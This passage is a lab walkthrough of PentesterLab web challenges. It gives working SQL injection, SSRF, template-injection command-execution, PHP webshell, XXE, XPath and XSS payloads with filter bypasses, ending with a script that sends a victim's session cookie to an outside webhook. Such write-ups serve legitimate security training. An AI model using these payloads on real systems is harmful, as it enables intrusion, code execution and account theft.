You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '''' and password=md5('')' at line 1
```
If we use `' or 1=1 -- ` as our username, by changing the username/password logic to check an OR always true condition (`or 1=1`) then, we can successfully bypass the login page and retrieve the key for this challenge.

### Essential 36// SQL Injection 02
[Challenge URL](https://pentesterlab.com/exercises/sqli_02/course)

Very similar to the previous challenge, we're again going to use SQLi to bypass the login page. This time, a single-quote returns the page normally, but a double-quote gives us a syntax error. This challenge, we'll use `" or 1=1 -- ` to bypass the login page. The logic is the same as the previous challenge, the only change is the specific syntax of a double-quote instead of a single.

### Essential 37// SQL Injection 03
[Challenge URL](https://pentesterlab.com/exercises/sqli_03/course)

We're told for this challenge, the dev implemented a check to prevent the database from returning more than a single result. However, we should be able to bypass this by using the `LIMIT` keyword.

If we use a single-quote in our username, we'll again get a syntax error, albeit one slightly less informative than the previous two challenges,
```MySQL
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'test')' at line 1
```

If we attempt to use our previous payload of `' or 1=1 -- `, instead of getting logged in, we get a page stating "MORE THAN ONE ACCOUNT FOUND". To get around this, we'll use `test' or 1=1 limit 1 #` for our payload in the username field. We're using a `#` instead of ` -- ` at the end of our query this time to get around a syntax error that appeared consistently when trying to use ` -- ` to end the query. Submit the payload with `limit` as the username, and you'll be able to retrieve the key for this challenge. 

### Essential 38// SQL Injection 04
[Challenge URL](https://pentesterlab.com/exercises/sqli_04/course)

This challenge, the dev has implemented a config that at first glance blocks our typical query of `'or 1=1 -- ` by throwing `ERROR NO SPACE` anytime a space is detected in the query. However, there's a couple ways to get around this. We can shift our query to `test'/**/or/**/1=1/**/#`, replacing the spaces in our query with a comment that immediately closes (`/**/`) and again using a `#` instead of ` -- `. Alternatively, we could use URL-encoded `tab` (`%09`) characters in-place of the `/**/` comment strings, making our payload in the username field `admin%27%09or%091%3D1%09--%09`. Using either method, submit the login request, and if you've correctly formatted your payload, you should get logged in and be able to retrieve the key for this challenge. 

### Essential 39// SQL Injection 05
[Challenge URL](https://pentesterlab.com/exercises/sqli_05/course)

We're again bypassing a login page using SQLi, this instance the dev has once again implemented the NO SPACES rule, and also blocked the use of `tab` characters. To get around this, we'll use the first payload from the previous challenge, using empty comments (`/**/`) in place of spaces. Submit `test'/**/or/**/1=1/**/#` as the username, and you should be able to retrieve the key for this challenge. 

### Essential 40// SQL Injection 06
[Challenge URL](https://pentesterlab.com/exercises/sqli_06/course)

Here we'll be bypassing the `addslashes` function, which is sometimes (incorrectly) used as a way to automatically add the escape-char backslash `\` to user-input based queries. This would change our `' or 1=1 -- ` to `\'or 1=1 --`, which should tell `MySQL` to not interpret the single-quote as a special character. `addslashes` operates on single-quotes `'`, double-quotes `"`, backslashes themselves `\`, and NULL-Bytes `NUL`.

This instance is a (challenge-description admitted) niche setup that's unlikely to occur in the wild, but nonetheless does happen. The vulnerability comes from the `character-set` that the `MySQL` instance is setup to use. The DB is using [GBK](https://en.wikipedia.org/wiki/GBK_(character_encoding)), a char-set for Simplified Chinese Characters. Because `addslashes` is setup to only act on a specific set of chars, we can use `\xBF`, which when URL-encoded is `%bf%27`. This works because the database drivers and the database itself are using different character sets, and the driver fails to properly escape//translate the `\xBF` char, and results in an *un*escaped single-quote. A more in-depth look can be found [here](https://shiflett.org/blog/2006/addslashes-versus-mysql-real-escape-string).

The most straight-forward way to solve this challenge is to edit and resend the login request in ZAP. If attempt to put either `\xBF` or `%bf%27` directly into the username field, it gets improperly (for our purposes) encoded, before being sent to the server, becoming `test%5CxBF+or+1%3D1+--+` for `\xBF` or `test%25bf%2527+or+1%3D1+--` for `%bf%27`. So, in order exploit this and bypass the login, we'll edit the `username` payload in the request body, and change it to `username=test%bf%27+or+1%3D1+--+&password=test` so our browser won't URL-encode our URL-encoding. After sending the request, scroll down the response body, and you should see the message "You are currently logged in! The key for this exercise is UUID".

NOTE: While the key is available from the response body inside of ZAP, if you'd like to see the request in your system browser, you must be sure to select the request to the index page `libcurl.so/` to see the logged in response. If you attempt to open the request to `libcurl.so/login.php`, it will open the default login page without actually submitting the payload.

### Essential 41// SSRF 01
[Challenge URL](https://pentesterlab.com/exercises/ssrf_01/course)

This challenge, we'll be using a Server Side Request Forgery (SSRF) to access an 'internal' document. SSRF's work by manipulating a webapp/server into making a request on our behalf to resources that we do not have access to, but that the server itself does. Let's assume we wanted access to a document on ServerBB that we're not allowed to access directly, but we do have access to ServerAA, and ServerAA is allowed to access ServerBB. If ServerAA is vulnerable to an SSRF, we can make ServerAA make a request to ServerBB for the document (or launch an internal network scan) we're actually after.

We're given a basic webpage, and told the key is located at the root of another web-server that's listening on localhost TCP port 1234. As a reminder, HTTP defaults to port 80, and HTTPS defaults to port 443. We can see in the URL that a document is getting loaded from somewhere, `libcurl.so/?url=https://assets.pentesterlab.com/hacker.txt`. 

In order to exploit the SSRF, we'll change the `url=` parameter to `url=http://localhost:1234`, which will cause the challenge instance server to make a request to the other webserver on port 1234 and retrieve the key for this challenge. 

### Essential 42// SSRF 02
[Challenge URL](https://pentesterlab.com/exercises/ssrf_02/course)

Here, the dev blocked making requests to the specific IP `127.0.0.1` (which is localhost). However, localhost is known by many names, including `localhost`, and `127.0.0.1` is the only entry being blocked. We can use the same payload we did last challenge, using `url=http://localhost:1234` to retrieve the key for this exercise. 

### Essential 43// SSRF 03
[Challenge URL](https://pentesterlab.com/exercises/ssrf_03/course)

This time, we're again trying to access the other webserver on port 1234. The dev has tightened security a bit from the last two challenges, and is now blocking requests to both `localhost` and `127.0.0.1`. Attempting to use either will cause the page to display "Welcome Invalid URL!" However, we're not out of options yet, if we use `http://0.0.0.0:1234`, we can access the key for this challenge.

### Essential 44// SSRF 04
[Challenge URL](https://pentesterlab.com/exercises/ssrf_04/course)

This time, the dev has blocked any requests from our challenge server to the one on port 1234 that don't match `assets.pentesterlab.com`, however the regex for matching this hasn't been implemented quite properly. For this challenge, a special DNS zone has been setup that will answer/return `127.0.0.1` for any host in the domain `hackingwithpentesterlab.link`.

Because the DNS zone has been setup, we can change the requested URL to `http://` (instead of `https://`), request localhost via the zone, and specify port 1234 using `?url=http://assets.pentesterlab.com.hackingwithpentesterlab.link:1234`.

### Essential 45// Server Side Template Injection 01
[Challenge URL](https://pentesterlab.com/exercises/ssti_01/course)

Here we'll be exploiting a Server Side Template Injection (SSTI) vulnerability. SSTI vulns are based on a webapp using user supplied input in a template rendered by the server, i.e. a template engine used to generate customer emails that takes the customer username as an input, or a wiki instance or blog that uses the server to format posts or comments. Because the template engine is running on the server, if we can inject a properly crafted payload using the template engine's built-in syntax, we may be able to execute arbitrary code on the server.

We're told for this challenge, the SSTI bug is related to how the webapp generates 404 pages. If we make a request that doesn't exist, like `libcurl.so/doesnotexist`, the server returns a page stating `# Page not Found: http://ptl-815a2b63-a96ebe77.libcurl.so/doesnotexist`. If we look at the source of the page, we see what is probably template-generated html;
```html
<div class="center-content error">
        <h1>Page not Found: http://ptl-815a2b63-a96ebe77.libcurl.so/testiguess</h1>
    </div>
```

If we change the URL to `libcurl.so/{{'7'*7}}`, the response page returns `# Page not Found: http://libcurl.so/7777777`, indicating that somewhere, the string `{{'7'*7}}` got evaluated as code, and returned a string of seven `7`s. If we change it to `{{7*7}}` (without the single-quotes around the first `7`), it returns `# Page not Found: http://libcurl.so/49`, again evaluating the statement and executing the multiplication. If we use the challenge supplied payload of `{{''.__class__.mro()[1].__subclasses__()}}` in our URL, we get `# libcurl.so/[<type 'str'>, <type 'unicode'>]`. Using this, we can obtain a list of every class loaded//available in the applications `python` environment if we adjust the payload to `{{''.__class__.mro()[2].__subclasses__()}}`. Changing the `1` to `2`  changes how far up our `mro()` (Method Resolution Order) goes up the object-inheritance tree of the `python` environment, and the `__sublcasses__()` method is listing out every object subclass associated with every object found. Essentially this is listing out every `from CLASS import SUBCLASS` statement found in the entire `python` applications code base, essentially giving us a layout of all the different functionalities we have access to. This also exposes the specific template engine being used, in this case `jinja2`.

In this case, the subclass we're most interested in is `<class 'subprocess.Popen'>` because this will allow us to directly call system commands on the server. To call our desired subclass, we need to know it's index number within the list of returned classes. To start, copy the entire list of classes from the 'page not found' page and paste it into a new file. We end up with a single-line file, so we'll then use a `sed` command to add a new line after every entry, `sed -i 's/>, />, \n'/g FILENAME`. This is searching for every instance of arrow-comma-space and replacing it with arrow-comma-newLine. From here, once `sed` has changed the file to have every class entry in it's own line, we can use `grep -n -i popen FILENAME`. This will search our file for the string `popen` (the subclass we want to use) and output the line number and string that matches the pattern. Once we've got the line number, in this case `234`, we know the index number of the class. The index number in this case will be `233`, `lineNumber - 1`, because our line count starts at `1` while the index starts at `0`.

With the index number, we can use `{{''.__class__.mro()[2].__subclasses__()[233]}}` to verify we have the correct index number, this should return `Page not Found: # libcurl.so/<class 'subprocess.Popen'>`. Now, we can use the `Popen` subclass to run arbitrary commands by appending the command to the URL, i.e. `libcurl.so/{{''.__class__.mro()[2].__subclasses__()[233]('uname')}}`. We'll get a response of `# Page not Found: http://libcurl.so/<subprocess.Popen object at 0x7f8a7085ef10>`, indicating our `uname` command executed. If we want to get the actual output of the command, we'll need to use the `communicate()` function from `subprocess` ([docs here](https://docs.python.org/3/library/subprocess.html)). If we change our payload to `/{{''.__class__.mro()[2].__subclasses__()[233]("uname--a",-shell=True,stdout=-1).communicate()[0]}}`, we get the full output of the `uname -a` command at the end of the "Page not Found" page. To score the exercise, replace `"uname -a"` in the above payload with the `"/usr/local/bin/score UUID"` command. If our syntax is correct and the command executes successfully, the page will return `# Page not Found: http://libcurl.so/Exercise completed!!`

#### Related Links
[H1 Uber RCE Writeup](https://hackerone.com/reports/125980)
[PortSwigger SSTI](https://portswigger.net/web-security/server-side-template-injection)
[PortSwigger Blog SSTI](https://portswigger.net/research/server-side-template-injection)
[Python Built-In MRO Docs](https://docs.python.org/release/2.6.4/library/stdtypes.html#class.__mro__) 
[Jinja Docs](https://jinja.palletsprojects.com/en/3.0.x/)

### Essential 46// Server Side Template Injection 02
[Challenge URL](https://pentesterlab.com/exercises/ssti_02/course)

We're again exploiting an SSTI vulnerability. However instead of an instance using the `jinja2` template engine, we're told it's using an older instance of `twig 1.9.0`. Also, the injection is likely in the URL's `name=` parameter instead of a custom 404 page like the last challenge.

Unlike with SQL injection, appending single or double-quotes to the URL has no effect, and the page responds and renders normally. But, if we revisit the multiplication payload from the last challenge and use `name={{7*7}}`, the page returns "Hello 49". Because this challenge is using a different template engine (`twig` instead of `jinja2`), our previous payloads using `__class__.mro()` aren't viable. Fortunately though, we're given a payload that will allow us to call `exec` using what looks like environment variables, `{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('uname')}}`. This payload will return "Hello Linux", we also get the full output if we change the command to `uname -a`, which indicates any valid system command we use should execute without having to make any additions to the payload to get the output. In order to score the challenge, we'll replace the `uname` command with `/usr/local/bin/score UUID`. We may not get any output from the score command, but refreshing the challenge description page confirms it gets marked as complete. 

### Essential 47// File Upload 01
[Challenge URL](https://pentesterlab.com/exercises/upload_01/course)

This challenge we'll be attacking a file upload mechanism on a `php` application. The application is supposed to allow the user to upload an image of their choice, but because of an utter lack of validation or limiting of what kinds of files can be uploaded, we can use this functionality to upload a `php webshell`. For this challenge, we'll use the provided (very simple) webshell code;
```php
<?php
  system($_GET["cmd"]);
?>
```
Copy the above code into a new file with a `.php` extension, and then select that file to upload from the challenge instance. After sending the "Send file" request, the server responds and gives a direct link to our file. Because this gives us the exact location of where our file was uploaded, we can go that link, then append our `cmd` parameter to the end of the URL, `libcurl.so/upload/basicWebShell.php?cmd=uname` for example. Because the server didn't place any restrictions on the file we uploaded, it's executing the webshell `php` code when we try to load the file in our browser, thus with the `cmd=` parameter, we can specify which command we want our `system($_GET[""]);` statement to run. To score the challenge, we'll replace `cmd=uname` with `cmd=/usr/local/bin/score UUID` to mark the challenge as complete. 

### Essential 48// File Upload 02
[Challenge URL](https://pentesterlab.com/exercises/upload_02/course)

The setup for this challenge is similar to the previous one, however the dev put a minor restriction on the file upload feature and blocked all files with the `.php` extension. If we attempt to upload our `basicWebShell.php` file to this instance, we get a response page stating "NO PHP". However, it seems the dev only explicitly blocked the `.php` extension, and `.php` isn't the only file extension valid for `php` file. We can use any of the following;
```php
.php
.php3
.php4
.php5
.phtml
```
There's many, many options when it comes to bypassing filename restrictions, but in this case changing our files extension to a differnt `phpN` version is the most straightforward. To bypass the dev's restriction, we can copy or rename our webshell to use `.php3` and the file will upload successfully. From here, we again navigate to our file from the link provided, then append our `cmd=` parameter. If our filename is `basicWebShell.php3`, the link we'll be using to execute our commands is `libcurl.so/upload/basicWebShell.php3?cmd=uname -a`. This should return the full output of the `uname -a` command. If it runs successfully, replace `uname -a` with the `/usr/local/bin/score UUID` command to complete the challenge. 

### Essential 49// XML Attacks 01
[Challenge URL](https://pentesterlab.com/exercises/xml_01/course)

Here we'll be exploiting a flaw in an `xml` parser. This challenge is taking `xml` input directly from the user-inputted URL, `ibcurl.so/?xml=<test>hacker</test>`. Some `xml` parsers will resolve external entities//resources, and because we have direct control over the `xml` being loaded by the web-server, we can craft a URL payload that will allow us to execute an arbitrary file read on the system. To start, we'll load the `xml SYSTEM` entity using `libcurl.so/?xml=<!DOCTYPE test [<!ENTITY x SYSTEM "file:///etc/passwd">]><test>%26x;</test>`. The `<test>%26x;</test>` at the end of the URL is using the server's `<test>` tags to call a reference to our declared `system` entity `x` using `%26x` (URL-encoded `&x;`). Note the semi-colon `;` after the `%26x`, it's a necessary character to get the server to evaluate the reference. If the above payload runs and returns the contents of `/etc/passwd`, we an change the file parameter to `"file:///pentesterlab.key"` to retrieve the key for this challenge.

### Essential 50// XML Attacks 02
[Challenge URL](https://pentesterlab.com/exercises/xml_02/course)

This challenge we're exploiting an `Xpath` expression. `Xpath` is an `xml` query language, similar to `SQL`, the `.xml` document acts as the database that the `Xpath` statement queries. The URL for the application is `libcurl.so/?name=hacker&password=pentesterlab`, and the `xml` parser is taking the `name=` and `password=` parameters from the URL. If we inject a single-quote into either parameter, we an array of warnings;
```xml
Warning: SimpleXMLElement::xpath(): Invalid predicate in /var/www/index.php on line 22
  
Warning: SimpleXMLElement::xpath(): xmlXPathEval: evaluation failed in /var/www/index.php on line 22
  
Warning: Variable passed to each() is not an array or object in /var/www/index.php on line 23
```
`Xpath` has boolean logic similar to `sql`, if we use `libcurl.so/?name=hacker&password=pentesterlab' and '1'='1` with an injected `and` statement, we get a 'normal' return of "Hello hacker". If we change it to `' and '1'='0`, the page doesn't return the "Hello " statement because our `'and '1'='0` statement evaluates as `False`. If we make it an `or` statement, we'll again get the "Hello $NAME" statement in the response. Given the results of the above logic tests, we can get an idea of what the underlying `xpath` statement looks like; `[PARENT NODES]/name[.='[INPUT]']/[CHILD NODES]`.

To comment out the remainder of the `xpath` query, we can use a URL-encoded NULL-byte (`%00`), and a closing-bracket (`]`) to complete the original query syntax. If we use `libcurl.so/?name=hacker']%00` as our URL, we get a "**Notice**: Undefined index: password in **/var/www/index.php** on line **20**" statement, and the string `hacker` by itself, without the original "Hello" portion. If we append an `or` statement so our username looks like `name=hacker' or 1=1]%00`, the page will return a full list of usernames, in this case `hacker` and `admin`.

We can attempt to use the payload `'%20or%201=1]/child::node()%00` to get information about the child-node//entry of our current node in the `xml` doc, but this will again return the list of usernames. In order to retrieve more information, we need to use the query to go further up in the hierarchy of the document, adding `parent::*` to our payload; `hacker'%20or%201=1]/parent::*/child::node()%00`. This will return every child-node(lower-hierarchy entry) from the root node of the document, which in this case gives us the username entry, and the password associated with the username. The returned page should contain the 'password' for the admin account, as well as the key for this challenge. However, if our goal was to login as the `admin` user, we could use the payload `admin']/parent::*/password%00` to confirm the entry we saw with the `hacker'%20or%201=1]/parent::*/child::node()%00` payload is in fact the password associated with the admin account. If we changed the first string in the `password` payload to `hacker`, it would give us the password of the `hacker` account. 

### Essential 51// XSS 01
[Challenge URL](https://pentesterlab.com/exercises/xss_01/course)

Here we'll be exploiting a cross-site scripting (XSS) vulnerability in the challenge web server. An XSS allows us to execute arbitrary JavaScript that's inputted on one page and returned to a user on another. The webpage gives us a link that allows us to personalize the returned page with a `name=` parameter in the URL, `libcurl.so/index.php?name=hacker`. We can inject JavaScript into the name parameter using `<script>` tags, `name=<script>alert(1)</script>`. This should return the page with an `alert` pop-up with the text `1` and an `OK` button to close the alert. This POC by itself doesn't do anything really malicious, but it does prove that we can execute arbitrary JavaScript. If we check the page source, we can find (on line 29 in this case) that our `alert` payload was successfully embedded into the webpage without being altered or encoded.

We can also open up developer tools on the page, and from the 'console' tab, inject our alert into the website. If we type into the console `alert('test')` the `OK` pop-up will fire on the page.

Note: if the payload inside of `alert()` is a `string` as far as JavaScript is concerned, we have to wrap the value in quotes like `alert('testlol')`, however if the value is an `int`, i.e. `alert(1)`, the quotes aren't required. 

To score this exercise, we'll submit our URL, `https://ptl-8ec04055-52ef3f9f.libcurl.so/index.php?name=%3Cscript%3Ealert(%27da053225-cf42-470a-b645-1d4ff90ac7c1%27)%3C/script%3E` in the 'URL' box of the Course/Labs Info tab. Once the 'victim' visits our 'malicious' link, the challenge will be marked as complete. 

### Essential 52// XSS 02
[Challenge URL](https://pentesterlab.com/exercises/xss_02/course)

We're again exploiting an XSS vulnerability in the page's `/index.php?name=` parameter, however the 'dev' has added some input filtering to the page. If we use the `<script>alert('lol')</script>` payload, the page returs "Welcome alert(lol)" without the actual `alert` pop-up firing. If we check the returned page source, we see that the opening and closing `<script></script>` tags have been stripped from the input in the returned page. However, the filtering appears to only operate on an *all lower-case* instance of `script`. If we use random capitilized//upper-case letters in the `<script>` tags, we can bypass the filtering using something like `name=test<scriPT>alert('lol')</ScRiPt>` and the `alert` pop-up should fire. Here, we can also use the browser-console to make the `alert` fire on our instance of the page.

To score the challenge, replace whatever you've used inside of `alert()` with the (single-quote wrapped) provided UUID, `https://libcurl.so/index.php?name=test%3CscriPT%3Ealert(%27dUUIDHERE%27)%3C/SCRIpt%3E` and submit the URL on the challenge course page.

### Essential 53// XSS 03
[Challenge URL](https://pentesterlab.com/exercises/xss_03/course)

We're attacking the same web application as previous challenges. This time, the 'dev' has implemented another more strict filtering policy. We have the same URL and `name=` parameter to work with. Using any lower/upper-case combination of letters for or `<script>` tags gets filtered. Checking the source of the returned page, we see `testalert(1)!` being returned from our input due to the `<script>` tags getting stripped.

Testing `/index.php?name=ad</script><script>min<s/script>` returns "Welcome admin!" with the rest of the text on the page stylized with strike-thru because of the leading `s` in our last `<s/script>`. Checking the source of the page shows
```html
<p>Welcome
        admin<s/script>!</p>
```

While potentially useful info, using `<s/script><s//script>` tags fails to fire the `alert`. Using `name=<script 'alert(1)'>test</script>` will get `<script 'alert(1)'>` embedded into the returned "Welcome" statement, but again the actual pop-up fails to fire, and our closing `</script>` tag still gets removed.

To bypass the dev's new filtering, we'll need to nest our `<script>` tags inside of another tag, i.e. `name=test<scr<script>ipt>alert(1)</scr</script>ipt>`, which if the syntax for the tags is correct, should return a page with the `alert` pop-up. To score this challenge, replace the `alert()` argument with the provided UUID and submit it to the URL form on the 'course' page. 

### Essential 54// XSS 04
[Challenge URL](https://pentesterlab.com/exercises/xss_04/course)

For this challenge, the dev has implemented a block on the string `script` in it's entirety. Using any of our previous payloads results in a page returning "Welcome error", in fact using `name=test script` gives the same error result. However, we have many options to get JavaScript to run without the `<script>` tag. A few of these options require the use of `event handlers`, which are dependent on user interaction, i.e. `onmouseover`, `onclick`, `onmouse`, `onvolumechange`, etc. 

For this example, we'll use `onerror`, which will cause the script to fire if the page encounters an error, which we can force by telling it to load a non-existent resource prior to the `alert()` function.

We'll use `name=test <img src='doesnotexist' onerror='alert(1)' />`, which will fire the `alert` pop-up when the page encounters an error, which it does attempting to load our `img src=doesnotexist` 'file'.

To score the challenge, replace the `alert()` argument with the provided UUID, wrapped in double-quotes `"` due to the single-quotes surrounding our `alert()` fucntion, and submit it to the URL form on the 'course' page. 

### Essential 55// XSS 05
[Challenge URL](https://pentesterlab.com/exercises/xss_05/course)

This round, `<script>` is not getting filtered from our input, however the call to `alert()` results in the "Welcome error" message if the string `alert` is anywhere in the `name=` parameter. 

However, we're told we can use `eval` and `String.fromCharCode()` to indirectly insert our alert function, as our `eval` statement will likely get executed *after* the filtering is performed.

To start, we'll use a quick `python` script to convert `alert(1)` to ASCII character codes;
```python
def to_ascii(text):
	ascii_values = [ord(character) for character in text]
	return ascii_values

text = input("Enter your string to convert to ASCII Codes \n")
	print(to_ascii(text))
```
Inputting `alert(1)` to our script should return `[97, 108, 101, 114, 116, 40, 49, 41]`. From there, in the browser console, we can call `String.fromCharCode(97, 108, 101, 114, 116, 40, 49, 41)` to verify that the ASCII codes convert back to `alert(1)`. Then, we'll wrap that in an `eval` function in the console, `eval(String.fromCharCode(97, 108, 101, 114, 116, 40, 49, 41))`, which should cause the `alert` pop up to fire on the page. From there, we'll take the `eval` statement and wrap it with `<script>` tags in the URL `name=` parameter, `name=test<script>eval(String.fromCharCode(97, 108, 101, 114, 116, 40, 49, 41))</script>`. If this successfully causes the `alert` popup to fire, we'll go back to our `python` script and use `alert(UUIDHERE)` to get our payload to score the challenge. Your output should look something like `[97, 108, 101, 114, 116, 40, 39, 100, 97, 48, 53, 51, 50, 50, 53, 45, 99, 102, 52, 50, 45, 52, 55, 48, 97, 45, 98, 54, 52, 53, 45, 49, 100, 52, 102, 102, 57, 48, 97, 99, 55, 99, 49, 39, 41]`, and we'll put the new longer sequence of ASCII char codes of the UUID into our `String.fromCharCode()` method. If the page returns the `alert` pop-up with our UUID, copy the full URL and submit it on the 'course' page to complete the challenge. 

### Essential 56// XSS 06
[Challenge URL](https://pentesterlab.com/exercises/xss_06/course)

This challenge, the `name=` input is returned slightly differently than previous challenges. Taking a look at the source of the returned page shows that our input is getting wrapped in `<script>` tags by the page and assigned as a variable;
```html
<p>Welcome!
	<script>
	var $a= "testingonetwo";
	</script></p>
```
To get our `alert` pop-up to fire, we'll need to properly end the `var $a = ` statement, and use a comment char (`//`) to comment out//block the rest of the script on the page. To do so, we'll use `name=test"; alert(1) //`. As far as the server is concerned, the `var $a = "test"` statement is completed by our semi-colon, then followed by `alert(1)`, which is already inside of a `<script>` tag from the page itself. If that payload fires the `alert` pop-up, replace the `1` with the UUID provided by the challenge. Assuming that URL correctly displays the UUID in the `alert` pop-up, submit the URL on the 'course' page to score the challenge.

### Essential 57// XSS 07
[Challenge URL](https://pentesterlab.com/exercises/xss_07/course)

Here the HTML source of the page is the same as the last challenge, but the `php` on the backend has changed to HTML-encode the `name=` parameter. If we attempt to use the payload from last challenge, `name=test"; alert(1) //`, the alert doesn't fire, and checking the source of the page shows our input gets returned as 
```html
<script> var $a= 'test&quot;; alert(1) //'; </script>
```
This time, our input is getting wrapped in single-quotes instead of double-quotes. However, we're told the application is using the (very common) `php` function `htmlentities` does not encode single-quote `'` characters unless the `ENT_QUOTES` flag is explicitly set.

To get our `alert` to fire, we'll change the double-quote from our previous challenge to a single-quote, `name=test'; alert(1) //`. From here, we can replace our `alert()` function argument with our UUID, and if it fires successfully, copy the URL and submit it to the URL form on the 'course' page. 

### Essential 58// XSS 08
[Challenge URL](https://pentesterlab.com/exercises/xss_08/course)

This challenge, we're given a webapp that takes user-input from a form on the page, and returns the user's input in the "Welcome HELLO $input" string. The `HTML` source for the page is;
```html
<p>Welcome
        HELLO test </p>
        <form action="[/index.php] method="POST">
        Your name:<input type="text" name="name" />
        <input type="submit" name="submit"/>
</form>
```
We're told the dev used `PHP_SELF` to build the form on the website, this allows us to call the `/index.php` page using any 'URL' that (REGEX) matches `/index.php`, which allows us to inject an XSS payload into the 'URL' that get's called from the form. The `PHP_SELF` function is used to take the input from the form, and use it as an input in the specified script, in this case `/index.php`. Because our input is being called directly into the `php` script, we can append our own script to the path.

Trying to use `/"><script>alert(1);</script>` won't fire the pop-up, but if we check the source of the returned page, it shoes all of our `< >` characters are getting HTML-encoded; `"&gt;&lt;script&gt;alert(1)&lt;/script&gt;`. Inputting the payload into the form doesn't work, but if we append our payload directly to the URL, `libcurl.so/index.php/"><script>alert(1)</script>`, our `alert` will successfully fire. This works because appending directly to the URL injects our added script directly into the `form action` section of the page. Checking the source of the returned page should show something like
```html
<form action="[/index.php/]"><script>alert(1)</script>" method="POST">
```
From here, we can use our UUID as the argument to our `alert` function, and if the pop-up correctly displays with the UUID, we can submit the *URL* to the course page to finish the challenge. 

### Essential 59// XSS 09
[Challenge URL](https://pentesterlab.com/exercises/xss_09/course)

This time, we'll be exploiting a DOM (Document Object Model) based XSS. There's a `script` section in the page source,
```html
<p>Welcome <script>document.write(decodeURIComponent(location.hash.substring(1)));</script></p>
```
That is taking everything after the hash/poundsign `#` in the URL, and using the `document.write()` function to write it to the page//document to generate the "Welcome #NAME" string. In order to test our payloads, we're going to have to do a *full refresh* (`ctrl+shift+r`) of the page, just changing the URL and hitting enter causes the script to call a cached value because the script is running on the *client*-side (our browser) instead of the server.

Even though the input from the URL is already inside a `<script>` tag, we can nest our own tags for `alert()` in the URL, i.e. `libcurl.so/index.php#<script>alert(1)</script>` which should successfully fire the `alert()` pop-up. If it does, replace the `alert()` argument with the provided UUID, full refresh the page to ensure the alert still fires correctly, then submit the URL on the 'course' page. 

### Essential 60// XSS 10
[Challenge URL](https://pentesterlab.com/exercises/xss_10/course)

This challenge, the webserver is setup identically to how it was in the XSS 01 challenge, but here our goal is closer to a real life use of XSS vulnerabilities. Our goal is to have our JavaScript steal a copy of the 'victim's session cookie, which would enable us to takeover the 'victim's current user-session, and potentially fully compromise the account.

Once we have our payload crafted to steal the session-cookie, we'll use a `webhook.site` instance as our redirect URL inside of an `<img src` tag. Instead of the typical `<script>alert(1)</script>` payload, we'll use;
```javascript
<script>
document.write('<img src="https://webhook.site/5f973e80-c5f8-4ae6-bff4-e314e8cf3c83?c='+document.cookie+'" />');
</script>
```
Where the `img src` is our `webhook.site` instance URL, and `document.cookie` should render as the user's session-cookie value once the 'victim' visits our link. We'll also need to URL-encode this payload in order for the `+` chars to be interpreted properly. If we visit our own link, the page should return a broken image with our `script` embedded in the page.

If our payload is correct, when we submit the full URL on the course page, the 'victim' will visit our link, and two requests will be made to our `webhook.site` page, the first being the original request made by the 'victim', and the second will be from our malicious javascript, that will have the user's session-cookie//the key for this challenge as a query string in the response body.
